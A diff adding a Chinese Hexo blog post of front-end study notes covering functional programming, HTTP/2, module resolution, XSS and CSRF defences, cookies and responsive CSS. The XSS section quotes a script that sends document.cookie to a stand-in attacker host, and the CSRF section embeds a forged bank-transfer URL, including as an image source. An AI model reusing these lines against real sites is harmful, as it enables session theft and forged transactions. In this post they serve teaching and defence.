@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="积硅步以至千里，再完美的知识体系也要由一个个细小的知识点构成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端细小知识点积累汇总">
+<meta property="og:url" content="http://example.com/2018/06/22/%E5%89%8D%E7%AB%AF%E7%BB%86%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="路漫漫其修远兮&lt;br &#x2F;&gt;吾将上下而求索">
+<meta property="og:description" content="积硅步以至千里，再完美的知识体系也要由一个个细小的知识点构成">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.A.com/transfer?account=666&money=10000">
+<meta property="article:published_time" content="2018-06-22T11:23:29.000Z">
+<meta property="article:modified_time" content="2018-07-01T09:51:25.000Z">
+<meta property="article:author" content="taoyingsong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.A.com/transfer?account=666&money=10000">
+
+<link rel="canonical" href="http://example.com/2018/06/22/%E5%89%8D%E7%AB%AF%E7%BB%86%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF%E6%B1%87%E6%80%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>前端细小知识点积累汇总 | 路漫漫其修远兮<br />吾将上下而求索</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">路漫漫其修远兮<br />吾将上下而求索</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/06/22/%E5%89%8D%E7%AB%AF%E7%BB%86%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF%E6%B1%87%E6%80%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="taoyingsong">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="路漫漫其修远兮<br />吾将上下而求索">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          前端细小知识点积累汇总
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-06-22 19:23:29" itemprop="dateCreated datePublished" datetime="2018-06-22T19:23:29+08:00">2018-06-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-07-01 17:51:25" itemprop="dateModified" datetime="2018-07-01T17:51:25+08:00">2018-07-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>积硅步以至千里，再完美的知识体系也要由一个个细小的知识点构成</p>
+<span id="more"></span>
+<p>本篇打算积累的东西后边比较多的会在这个地方进行：<a target="_blank" rel="noopener" href="https://github.com/f2e-awesome/knowledge">https://github.com/f2e-awesome/knowledge</a></p>
+<h2 id="框架相关"><a href="#框架相关" class="headerlink" title="框架相关"></a>框架相关</h2><p>Flutter——是谷歌的移动UI框架，可以快速在iOS和Android上构建高质量的原生用户界面。<br>Next</p>
+<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>redux-saga</p>
+<h2 id="编码规范-x2F-辅助工具"><a href="#编码规范-x2F-辅助工具" class="headerlink" title="编码规范&#x2F;辅助工具"></a>编码规范&#x2F;辅助工具</h2><p>TypeScript<br>Prettier<br>husky</p>
+<h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><p>Visual Studio Code<br>Atom<br>WebStorm</p>
+<h2 id="函数式编程、纯函数、高阶组件、柯里化"><a href="#函数式编程、纯函数、高阶组件、柯里化" class="headerlink" title="函数式编程、纯函数、高阶组件、柯里化"></a>函数式编程、纯函数、高阶组件、柯里化</h2><p>JavaScript 函数式编程是一个存在了很久的话题，但似乎从 2016 年开始，它变得越来越火热。这可能是因为 ES6 语法对于函数式编程更为友好<br>我理解的函数式编程:<br>函数式编程 ( Functional Programming ) 是一种以函数为基础的编程方式和代码组织方式，能够带来更好的代码调试及项目维护的优势。<br>我认为函数式编程可以理解为，以函数作为主要载体的编程方式，用函数去拆解、抽象一般的表达式<br>与命令式相比，这样做的好处在哪？主要有以下几点：</p>
+<ul>
+<li>语义更加清晰</li>
+<li>可复用性更高</li>
+<li>可维护性更好</li>
+<li>作用域局限，副作用少<br>基本的函数式编程<br>当情况变得更加复杂时，表达式的写法会遇到几个问题：</li>
+</ul>
+<ol>
+<li>表意不明显，逐渐变得难以维护</li>
+<li>复用性差，会产生更多的代码量</li>
+<li>会产生很多中间变量</li>
+</ol>
+<p>链式优化</p>
+<p>常见的函数式编程模型<br>闭包（Closure）<br>闭包的弊端:<br>持久化变量不会被正常释放，持续占用内存空间，很容易造成内存浪费，所以一般需要一些额外手动的清理机制。比如根据情况设置数据过期时间什么的<br>高阶函数：接受或者返回一个函数的函数称为高阶函数——Array.map , Array.reduce, Array.filter<br>柯里化（Currying）:给定一个函数的部分参数，生成一个接受其他参数的新函数<br>组合（Composing）:将多个函数的能力合并，创造一个新的函数<br><a target="_blank" rel="noopener" href="http://taobaofed.org/blog/2017/03/16/javascript-functional-programing/">http://taobaofed.org/blog/2017/03/16/javascript-functional-programing/</a></p>
+<p>下边这篇主要介绍实际开发中用到的函数式编程：<br><a target="_blank" rel="noopener" href="http://www.alloyteam.com/2016/09/talk-about-functional-programming/">http://www.alloyteam.com/2016/09/talk-about-functional-programming/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2012/04/functional_programming.html">http://www.ruanyifeng.com/blog/2012/04/functional_programming.html</a></p>
+<h2 id="Http和https的区别，https的数据传输过程是如何的，http2是什么，有什么好处，可以解决现在的什么问题"><a href="#Http和https的区别，https的数据传输过程是如何的，http2是什么，有什么好处，可以解决现在的什么问题" class="headerlink" title="Http和https的区别，https的数据传输过程是如何的，http2是什么，有什么好处，可以解决现在的什么问题"></a>Http和https的区别，https的数据传输过程是如何的，http2是什么，有什么好处，可以解决现在的什么问题</h2><p>HTTP&#x2F;2.0 相比1.0有哪些重大改进<br>多路复用 (Multiplexing)<br>多路复用允许同时通过单一的 HTTP&#x2F;2 连接发起多重的请求-响应消息。<br>在 HTTP&#x2F;1.1 协议中 「浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞」</p>
+<p>二进制分帧<br>HTTP 性能优化的关键并不在于高带宽，而是低延迟。<br>HTTP&#x2F;2 通过让所有数据流共用同一个连接，可以更有效地使用 TCP 连接，让高带宽也能真正的服务于 HTTP 的性能提升。</p>
+<p>首部压缩</p>
+<p>服务端推送<br>Server Push 让 HTTP1.x 时代使用内嵌资源的优化手段变得没有意义；如果一个请求是由你的主页发起的，服务器很可能会响应主页内容、logo 以及样式表，因为它知道客户端会用到这些东西。这相当于在一个 HTML 文档内集合了所有的资源，不过与之相比，服务器推送还有一个很大的优势：可以缓存！也让在遵循同源的情况下，不同页面之间可以共享缓存资源成为可能。<br><a target="_blank" rel="noopener" href="http://www.alloyteam.com/2016/07/httphttp2-0spdyhttps-reading-this-is-enough/">http://www.alloyteam.com/2016/07/httphttp2-0spdyhttps-reading-this-is-enough/</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/34074946">https://www.zhihu.com/question/34074946</a></p>
+<h2 id="工程化相关："><a href="#工程化相关：" class="headerlink" title="工程化相关："></a>工程化相关：</h2><h3 id="内存泄漏问题："><a href="#内存泄漏问题：" class="headerlink" title="内存泄漏问题："></a>内存泄漏问题：</h3><p>概念问题：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/763ba9562864%EF%BC%88%E4%B8%BB%E8%A6%81%E7%9C%8B%E8%BF%99%E4%B8%AA%EF%BC%8C%E5%93%AA%E4%BA%9B%E6%93%8D%E4%BD%9C%E4%BC%9A%E5%BC%95%E8%B5%B7%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%EF%BC%8C%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3%EF%BC%89">https://www.jianshu.com/p/763ba9562864（主要看这个，哪些操作会引起内存泄漏，怎么解决）</a><br>具体的排查方法：<br><a target="_blank" rel="noopener" href="http://frontenddev.org/link/js-memory-leak-screening-method-chrome-profiles.html">http://frontenddev.org/link/js-memory-leak-screening-method-chrome-profiles.html</a><br><a target="_blank" rel="noopener" href="https://github.com/wengjq/Blog/issues/1">https://github.com/wengjq/Blog/issues/1</a></p>
+<h3 id="node路径解析规则："><a href="#node路径解析规则：" class="headerlink" title="node路径解析规则："></a>node路径解析规则：</h3><p>require方法中的文件查找策略：<br>Node.js的模块分为两类，一类为原生（核心）模块，一类为文件模块。原生模块在Node.js源代码编译的时候编译进了二进制执行文件，加载的速度最快。另一类文件模块是动态加载的，加载速度比原生模块慢。但是Node.js对原生模块和文件模块都进行了缓存，于是在第二次require时，是不会有重复开销的。其中原生模块都被定义在 lib 这个目录下面，文件模块则不定性。</p>
+<p>从文件模块缓存中加载</p>
+<p>尽管原生模块与文件模块的优先级不同，但是都不会优先于从文件模块的缓存中加载已经存在的模块。</p>
+<p>从原生模块加载</p>
+<p>原生模块的优先级仅次于文件模块缓存的优先级。require方法在解析文件名之后，优先检查模块是否在原生模块列表中。以http模块为例，尽管在目录下存在一个http&#x2F;http.js&#x2F;http.node&#x2F;http.json文件，require(“http”)都不会从这些文件中加载，而是从原生模块中加载。</p>
+<p>原生模块也有一个缓存区，同样也是优先从缓存区加载。如果缓存区没有被加载过，则调用原生模块的加载方式进行加载和执行。</p>
+<p>从文件加载</p>
+<p>当文件模块缓存中不存在，而且不是原生模块的时候，Node.js会解析require方法传入的参数，并从文件系统中加载实际的文件，加载过程中的包装和编译细节在前一节中已经介绍过，这里我们将详细描述查找文件模块的过程，其中，也有一些细节值得知晓。</p>
+<p>require方法接受以下几种参数的传递：</p>
+<ul>
+<li>http、fs、path等，原生模块。</li>
+<li>.&#x2F;mod或..&#x2F;mod，相对路径的文件模块。</li>
+<li>&#x2F;pathtomodule&#x2F;mod，绝对路径的文件模块。</li>
+<li>mod，非原生模块的文件模块。</li>
+</ul>
+<p>简而言之，如果require绝对路径的文件，查找时不会去遍历每一个node_modules目录，其速度最快。其余流程如下：</p>
+<ol>
+<li>从module path数组中取出第一个目录作为查找基准。</li>
+<li>直接从目录中查找该文件，如果存在，则结束查找。如果不存在，则进行下一条查找。</li>
+<li>尝试添加.js、.json、.node后缀后查找，如果存在文件，则结束查找。如果不存在，则进行下一条。</li>
+<li>尝试将require的参数作为一个包来进行查找，读取目录下的package.json文件，取得main参数指定的文件。</li>
+<li>尝试查找该文件，如果存在，则结束查找。如果不存在，则进行第3条查找。</li>
+<li>如果继续失败，则取出module path数组中的下一个目录作为基准查找，循环第1至5个步骤。</li>
+<li>如果继续失败，循环第1至6个步骤，直到module path中的最后一个值。</li>
+<li>如果仍然失败，则抛出异常。</li>
+</ol>
+<p>参考：<a target="_blank" rel="noopener" href="http://www.infoq.com/cn/articles/nodejs-module-mechanism">http://www.infoq.com/cn/articles/nodejs-module-mechanism</a></p>
+<h3 id="webpack模块解析规则："><a href="#webpack模块解析规则：" class="headerlink" title="webpack模块解析规则："></a>webpack模块解析规则：</h3><p>解析相对路径<br>    查找相对当前模块的路径下是否有对应文件或文件夹<br>    是文件则直接加载<br>    是文件夹则继续查找文件夹下的 package.json 文件<br>    有 package.json 文件则按照文件中 main 字段的文件名来查找文件<br>    无 package.json 或者无 main 字段则查找 index.js 文件<br>解析模块名<br>    查找当前文件目录下，父级目录及以上目录下的 node_modules 文件夹，看是否有对应名称的模块<br>解析绝对路径（不建议使用）<br>    直接查找对应路径的文件</p>
+<h2 id="安全："><a href="#安全：" class="headerlink" title="安全："></a>安全：</h2><p>参考：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/-new/p/7135814.html">http://www.cnblogs.com/-new/p/7135814.html</a><br>前言：<br>共提到了4中攻击方式，分别是xss攻击（关键是脚本，利用恶意脚本发起攻击），CSRF攻击（关键是借助本地cookie进行认证，伪造发送请求），SQL注入（关键是通过用sql语句伪造参数发出攻击），DDOS攻击（关键是通过手段发出大量请求，最后令服务器崩溃）</p>
+<ul>
+<li>之所以攻击者能成功攻击，用户操作是一个原因，服务器端没有做好防御是一个问题，因为无法控制用户的操作，所以需要我们服务器端的开发做好防御。没有觉得绝对安全，只要更安全。</li>
+</ul>
+<p>这里只说和前端有关系的攻击：</p>
+<h3 id="1、XSS"><a href="#1、XSS" class="headerlink" title="1、XSS:"></a>1、XSS:</h3><p>概念</p>
+<ul>
+<li><p>全称是跨站脚本攻击（Cross Site Scripting），指攻击者在网页中嵌入恶意脚本程序。<br>案列</p>
+</li>
+<li><p>比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的 <script>window.open(“<a target="_blank" rel="noopener" href="http://www.gongji.com/?param=%E2%80%9D+document.cookie">www.gongji.com?param=”+document.cookie</a>)</script>,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了。要知道JS 代码一旦执行，那可就不受控制了，因为它跟网页原有的 JS 有同样的权限。</p>
+</li>
+</ul>
+<p>危害：</p>
+<ol>
+<li>盗取账号。</li>
+<li>控制浏览器行为。<br>等<br>被攻击的原因</li>
+</ol>
+<ul>
+<li><p>用户输入的数据变成了代码，比如说上面的<code>&lt;script&gt;</code>,应该只是字符串却有了代码的作用。<br>预防</p>
+</li>
+<li><p>将输入的数据进行转义处理，比如说讲 &lt; 转义成&amp;lt；<br>除此之外，还可以通过对 cookie 进行较强的控制，比如对敏感的 cookie 增加http-only限制，让 JS 获取不到 cookie 的内容。</p>
+</li>
+</ul>
+<p>引号书写？</p>
+<h3 id="2、CSRF"><a href="#2、CSRF" class="headerlink" title="2、CSRF:"></a>2、CSRF:</h3><p>概念</p>
+<ul>
+<li><p>全称是跨站请求伪造(cross site request forgery),指通过伪装成受信任用户的进行访问，通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。<br>案列</p>
+</li>
+<li><p>这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说我登录了A银行网站，然后我又访问了室友给的一个流氓网站，然后点了里面的一个链接 <a target="_blank" rel="noopener" href="http://www.a.com/transfer?account=666&amp;money=10000,%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%BE%88%E5%8F%AF%E8%83%BD%E6%88%91%E5%B0%B1%E5%90%91%E8%B4%A6%E5%8F%B7%E4%B8%BA666%E7%9A%84%E4%BA%BA%E8%BD%AC%E4%BA%861w%E8%BD%AF%E5%A6%B9%E5%B8%81">www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w软妹币</a></p>
+</li>
+<li><p>注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接，比如说一个<img src="http://www.A.com/transfer?account=666&money=10000"><br>被攻击的原因</p>
+</li>
+<li><p>用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求</p>
+</li>
+<li><p>某些页面的删除请求（拼接的json接口）在别的网站的中发起，不带token很容易就可以通过了，带token的可以防止，是因为其他网站跨域很难获取到token，即便token写在页面中。token放在页面中、相应头中、response中都可以只要前端能获取到在请求的时候放在request 头中就可以了<br>预防</p>
+</li>
+<li><p>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的cookie，那么如果我们不用cookie来验证不就可以预防了。所以我们可以采用csrf token（不存储于浏览器）认证。</p>
+</li>
+<li><p>通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。</p>
+<pre><code>浏览器中输入任意路径回车是没有referer的（不论是html，还是json请求），输入访问链接后network html之外其他的加载都有，已经加载出来的页面中进行请求操作也有referer
+</code></pre>
+</li>
+</ul>
+<p>关于CSRF Tokens<br>csrf 是在获取不到cookie的情况下才使用的，利用用户权限做的操作。<br>页面刷新，服务器生成token到页面，服务器自己也备份一份，表单请求的时候验证是否相等，不相等视为csrf攻击。<br>此token可以设置实效时间防治暴力破解什么的。页面刷新时token更新。<br>第三方是很难获取到token的<br>referer也可以一定程度上有效果，但是好像比较麻烦好像可以被第三方重制<br>另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。<br><a target="_blank" rel="noopener" href="https://www.imooc.com/article/18069">https://www.imooc.com/article/18069</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/22521378">https://zhuanlan.zhihu.com/p/22521378</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/lion19930924/article/details/50955000">https://blog.csdn.net/lion19930924/article/details/50955000</a></p>
+<h3 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h3><p>身份验证token<br>基于 Token 的身份验证方法</p>
+<p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
+<ol>
+<li>客户端使用用户名跟密码请求登录</li>
+<li>服务端收到请求，去验证用户名与密码</li>
+<li>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</li>
+<li>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</li>
+<li>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</li>
+<li>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</li>
+</ol>
+<p>Cookie:<br>首先必须明确一点，存储cookie是浏览器提供的功能。cookie 其实是存储在浏览器中的纯文本，浏览器的安装目录下会专门有一个 cookie 文件夹来存放各个域下设置的cookie。</p>
+<p>当网页要发http请求时，浏览器会先检查是否有相应的cookie，有则自动添加在request header中的cookie字段中。这些是浏览器自动帮我们做的，而且每一次http请求浏览器都会自动帮我们做。如果数据并不是每个请求都需要发给服务端的数据，浏览器这设置自动处理无疑增加了网络开销。</p>
+<p>但在 localStorage 出现之前，cookie被滥用当做了存储工具。什么数据都放在cookie中，即使这些数据只在页面中使用而不需要随请求传送到服务端。当然cookie标准还是做了一些限制的：每个域名下的cookie 的大小最大为4KB，每个域名下的cookie数量最多为20个（但很多浏览器厂商在具体实现时支持大于20个）。</p>
+<p>httpOnly<br>当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括【读取】、【修改】、【删除】等）这个cookie。<br>这种类型的cookie只能通过服务端来设置。</p>
+<p>服务端设置 cookie</p>
+<ul>
+<li>一个set-Cookie字段只能设置一个cookie，当你要想设置多个 cookie，需要添加同样多的set-Cookie字段</li>
+<li>服务端可以设置cookie 的 所有选项：expires、domain、path、secure、HttpOnly</li>
+<li>客户端可以设置cookie 的下列选项：expires、domain、path、secure（有条件：只有在https协议的网页中，客户端设置secure类型的 cookie 才能成功），但无法设置HttpOnly选项。</li>
+</ul>
+<p>用 js 如何设置多个 cookie</p>
+<p>当要设置多个cookie时， js 代码很自然地我们会这么写：</p>
+<p>document.cookie &#x3D; “name&#x3D;Jonh; age&#x3D;12; class&#x3D;111”;<br>但你会发现这样写只是添加了第一个cookie“name&#x3D;John”，后面的所有cookie都没有添加成功。所以最简单的设置多个cookie的方法就在重复执行document.cookie &#x3D; “key&#x3D;name”，如下：</p>
+<p>document.cookie &#x3D; “name&#x3D;Jonh”;<br>document.cookie &#x3D; “age&#x3D;12”;<br>document.cookie &#x3D; “class&#x3D;111”;</p>
+<p>补充：</p>
+<ol>
+<li>什么时候 cookie 会被覆盖：name&#x2F;domain&#x2F;path 这3个字段都相同的时候；</li>
+<li>关于domain的补充说明（参考1&#x2F;参考2）：<ol>
+<li>如果显式设置了 domain，则设置成什么，浏览器就存成什么；但如果没有显式设置，则浏览器会自动取 url 的 host 作为 domain 值；</li>
+<li>新的规范中，显式设置 domain 时，如果 value 最前面带点，则浏览器处理时会将这个点去掉，所以最后浏览器存的就是没有点的（注意：但目前大多数浏览器并未全部这么实现）</li>
+<li>前面带点‘.’和不带点‘.’有啥区别：<ul>
+<li>带点：任何 subdomain 都可以访问，包括父 domain</li>
+<li>不带点：只有完全一样的域名才能访问，subdomain 不能（但在 IE 下比较特殊，它支持 subdomain 访问）</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<p>简单明了区分escape、encodeURI和encodeURIComponent<br>1、如果只是编码字符串，不和URL有半毛钱关系，那么用escape。<br>2、如果你需要编码整个URL，然后需要使用这个URL，那么用encodeURI。<br>3、当你需要编码URL中的参数的时候，那么encodeURIComponent是最好方法。</p>
+<h2 id="移动端相关"><a href="#移动端相关" class="headerlink" title="移动端相关"></a>移动端相关</h2><h3 id="响应式页面开发："><a href="#响应式页面开发：" class="headerlink" title="响应式页面开发："></a>响应式页面开发：</h3><p><strong>步骤 1</strong> - 添加 viewport meta 标签</p>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<p><strong>步骤 2</strong> - 使用 Media Queries<br>2 种用法<br>    &lt;link rel&#x3D;”stylesheet” media&#x3D;”(max-width: 640px)” href&#x3D;”max-640px.css”&gt;<br>    @media (max-width: 640px) { &#x2F;<em>当视窗宽度小于或等于 640px 时，这里的样式将生效</em>&#x2F;}<br>样式断点：可以从业界一些热门可靠的 CSS 框架中寻找参考答案，例如 Bulma，其采用的「样式断点」有 5 个，实际工作中需要我们同视觉设计师一起沟通确认，因为视觉设计师可能需要根据不同的断点为页面设计不同的视觉表现。</p>
+<p><strong>步骤 3</strong> - 使用 Viewport 单位及 rem<br>Media Queries 只解决了「为不同特性的浏览器视窗使用不同的样式代码」的问题，而 Viewport 单位及 rem 的应用，则是为了解决第二个问题：让页面元素的尺寸能够依据浏览器视窗尺寸变化而平滑变化。</p>
+<p><code>方法 1</code> - 仅使用 vw 作为 CSS 长度单位</p>
+<ol>
+<li><p>利用 Sass 函数将设计稿元素尺寸的像素单位转换为 vw 单位<br>&#x2F;&#x2F; iPhone 6尺寸作为设计稿基准<br>$vw_base: 375;<br>@function vw($px) {<br> @return ($px &#x2F; $vm_base) * 100vw;<br>}</p>
+</li>
+<li><p>无论是文本字号大小还是布局高宽、间距、留白等都使用 vw 作为 CSS 单位<br>.mod_nav {<br> background-color: #fff;<br> &amp;_list {<br> display: flex;<br> padding: vw(15) vw(10) vw(10); &#x2F;&#x2F; 内间距<br> &amp;_item {<br>     flex: 1;<br>     text-align: center;<br>     font-size: vw(10); &#x2F;&#x2F; 字体大小<br>     &amp;_logo {<br>         display: block;<br>         margin: 0 auto;<br>         width: vw(40); &#x2F;&#x2F; 宽度<br>         height: vw(40); &#x2F;&#x2F; 高度<br>         img {<br>             display: block;<br>             margin: 0 auto;<br>             max-width: 100%;<br>         }<br>     }<br>     &amp;_name {<br>         margin-top: vw(2);<br>     }<br> }<br> }<br>}</p>
+</li>
+<li><p>1 物理像素线（也就是普通屏幕下 1px ，高清屏幕下 0.5px 的情况）采用 transform 属性 scale 实现<br>.mod_grid {<br> position: relative;<br> &amp;::after {<br> &#x2F;&#x2F; 实现1物理像素的下边框线<br> content: ‘’;<br> position: absolute;<br> z-index: 1;<br> pointer-events: none;<br> background-color: #ddd;<br> height: 1px;<br> left: 0;<br> right: 0;<br> top: 0;<br> @media only screen and (-webkit-min-device-pixel-ratio: 2) {<br>     -webkit-transform: scaleY(0.5);<br>     -webkit-transform-origin: 50% 0%;<br> }<br> }<br> …<br>}</p>
+</li>
+<li><p>对于需要保持高宽比的图，应改用 padding-top 实现<br>.mod_banner {<br> position: relative;<br> &#x2F;&#x2F; 使用padding-top 实现宽高比为 100:750 的图片区域<br> padding-top: percentage(100&#x2F;750);<br> height: 0;<br> overflow: hidden;<br> img {<br> width: 100%;<br> height: auto;<br> position: absolute;<br> left: 0;<br> top: 0;<br> }<br>}</p>
+</li>
+</ol>
+<p>由此，我们不需要增加其他任何额外的脚本代码就能够轻易实现一个常见布局的响应式页面，效果如下：</p>
+<p><code>方法 2</code> - vw 搭配 rem，寻找最优解，其实vw方案也可以限制宽度<br>方法1依赖于视窗大小而自动缩放，无论视窗过大还是过小，它也随着视窗过大或者过小，失去了最大最小宽度的限制，有时候不一定是我们所期待的展示效果。<br>当然，你可以不在乎移动端页面在 PC 上的展现效果，但如果有低成本却有效的办法来修复这样的小瑕疵，是真切可以为部分用户提升体验的。</p>
+<p>通过以下步骤来进行优化：</p>
+<ol>
+<li>给根元素的字体大小设置随着视窗变化而变化的 vw 单位，这样就可以实现动态改变其大小</li>
+<li>其他元素的文本字号大小、布局高宽、间距、留白都使用 rem 单位</li>
